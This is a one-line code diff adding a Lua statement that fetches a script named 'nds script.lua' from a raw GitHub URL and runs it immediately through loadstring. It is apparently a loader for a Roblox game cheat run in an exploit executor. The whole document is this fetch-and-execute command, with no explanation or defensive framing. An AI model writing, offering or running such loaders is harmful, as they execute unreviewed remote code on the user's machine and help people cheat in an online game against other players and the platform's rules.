@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ngr123/nds-script/main/nds%20script.lua'))()
